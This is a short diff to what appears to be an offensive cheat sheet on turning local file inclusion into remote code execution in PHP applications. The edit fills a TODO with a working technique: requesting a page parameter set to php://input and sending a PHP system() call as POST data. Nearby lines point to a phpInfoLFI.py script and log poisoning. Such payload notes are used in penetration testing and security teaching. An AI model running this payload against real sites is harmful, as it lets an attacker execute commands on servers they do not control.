@@ -117,11 +117,11 @@ Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/down
 
 
 ## LFI to RCE via input:// stream
-TODO
-file=php://input
-(specify your payload in the POST parameters,
-
-
+Specify your payload in the POST parameters
+```
+http://example.com/index.php?page=php://input
+POST DATA: <? system('id'); ?>
+```
 
 ## LFI to RCE via controlled log file
 Just append your PHP code into the log file and include it.
